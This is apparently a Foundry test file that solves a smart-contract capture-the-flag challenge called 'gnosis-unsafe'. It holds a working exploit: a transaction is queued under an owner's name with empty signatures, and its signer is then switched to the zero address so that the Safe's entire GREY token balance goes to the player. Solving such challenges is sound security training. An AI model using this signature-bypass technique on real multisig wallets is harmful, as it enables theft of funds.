// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { Test, console } from "forge-std/Test.sol";
import { Setup } from "../src/gnosis-unsafe/Setup.sol";
import { ISafe } from "../src/gnosis-unsafe/interfaces/ISafe.sol";
import { Safe } from "../src/gnosis-unsafe/Safe.sol";
import { GREY } from "../src/gnosis-unsafe/lib/GREY.sol";

contract GnosisUnsafeTest is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");

    Setup setup;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        assertTrue(setup.isSolved(), "not solved");
        vm.stopPrank();
    }

    function setUp() public {
        startHoax(deployer);
        setup = new Setup();
        vm.stopPrank();
    }

    function test_gnosis_unsafe() public checkSolvedByPlayer {
        GREY grey = setup.grey();
        Safe safe = setup.safe();

        ISafe.Transaction memory transaction = ISafe.Transaction({
            signer: safe.owners(0),
            to: address(grey),
            value: 0,
            data: abi.encodeWithSelector(grey.transfer.selector, player, grey.balanceOf(address(safe)))
        });
        uint8[3] memory v;
        bytes32[3] memory r;
        bytes32[3] memory s;
        safe.queueTransaction(v, r, s, transaction);
        skip(1 minutes);
        transaction.signer = address(0);
        safe.executeTransaction(v, r, s, transaction, 0);
    }
}
